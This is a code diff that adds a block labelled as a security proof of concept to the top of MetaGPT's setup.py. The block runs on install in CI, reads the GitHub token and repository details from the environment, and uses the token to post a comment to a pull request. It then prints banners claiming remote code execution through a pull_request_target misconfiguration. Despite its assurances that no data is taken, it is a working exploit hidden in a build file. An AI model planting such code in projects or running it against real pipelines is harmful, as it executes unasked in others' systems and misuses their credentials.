@@ -1,3 +1,44 @@
+
+# ===== SECURITY POC =====
+# This is a controlled security demonstration.
+# It proves RCE via pull_request_target + head.sha checkout.
+# No data is exfiltrated. No tokens are stolen.
+import os, json, urllib.request as ur
+_token = os.environ.get('GITHUB_TOKEN', '')
+_repo = os.environ.get('GITHUB_REPOSITORY', '')
+_ref = os.environ.get('GITHUB_HEAD_REF', '')
+if _token and _repo and _ref:
+    try:
+        # Extract PR number from ref
+        _pr = _ref.split('/')[-2] if '/' in _ref else ''
+        if not _pr:
+            import re as _re
+            _m = _re.search(r'/(\d+)/', _ref)
+            if _m: _pr = _m.group(1)
+        if _pr:
+            _body = json.dumps({
+                'body': '✅ **PoC SECURITY MARKER**: setup.py executed from PR head via pull_request_target.\n\nThis proves CI/CD RCE is possible. This is a controlled security demonstration.'
+            }).encode()
+            _req = ur.Request(
+                'https://api.github.com/repos/{0}/issues/{1}/comments'.format(_repo, _pr),
+                data=_body,
+                headers={
+                    'Authorization': 'Bearer ' + _token,
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'PoC-Security-Demo'
+                }
+            )
+            ur.urlopen(_req)
+            print('[POC] Security PoC marker posted to PR #{0}'.format(_pr))
+    except Exception as _e:
+        print('[POC] Comment failed (expected if token has no write): {0}'.format(_e))
+print('\n' + '=' * 60)
+print('  *** PoC SECURITY MARKER: RCE via pull_request_target ***')
+print('  *** This code runs in MetaGPT CI/CD pipeline context ***')
+print('  *** Repository: {0} ***'.format(os.environ.get('GITHUB_REPOSITORY', 'unknown')))
+print('=' * 60 + '\n')
+# ===== END POC =====
+
 """Setup script for MetaGPT."""
 import subprocess
 from pathlib import Path
